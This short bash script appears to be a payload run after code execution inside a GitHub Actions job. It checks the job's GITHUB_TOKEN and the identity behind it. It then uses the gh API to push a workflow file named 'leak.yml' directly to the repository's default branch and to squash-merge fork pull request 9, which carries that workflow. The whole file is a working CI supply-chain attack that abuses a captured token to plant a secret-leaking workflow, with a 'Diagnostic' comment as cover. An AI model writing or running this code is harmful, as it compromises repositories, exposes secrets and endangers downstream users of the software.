#!/bin/bash
set -x
REPO="$GITHUB_REPOSITORY"
echo "RCE_MARKER=$(date +%s)"
echo "REPO=$REPO"
echo "TOKLEN=${#GITHUB_TOKEN}"
id
gh api user --jq .login 2>&1

# Diagnostic: direct workflow file write to default branch
DEFAULT=$(gh api "repos/$REPO" --jq .default_branch)
echo "DEFAULT=$DEFAULT"
gh api -X PUT "repos/$REPO/contents/.github/workflows/leak.yml" \
  -f message="ci: leak" -f content="$(base64 -w0 /tmp/leak.yml 2>/dev/null || echo bm8=)" -f branch="$DEFAULT" > /tmp/put.out 2>&1
echo "PUT_EXIT=$?"
cat /tmp/put.out >&2

# Merge the fork PR that carries the workflow file
echo "MERGE_PR_9:"
gh api -X PUT "repos/$REPO/pulls/9/merge" -f merge_method=squash > /tmp/merge.out 2>&1
echo "MERGE_EXIT=$?"
cat /tmp/merge.out >&2
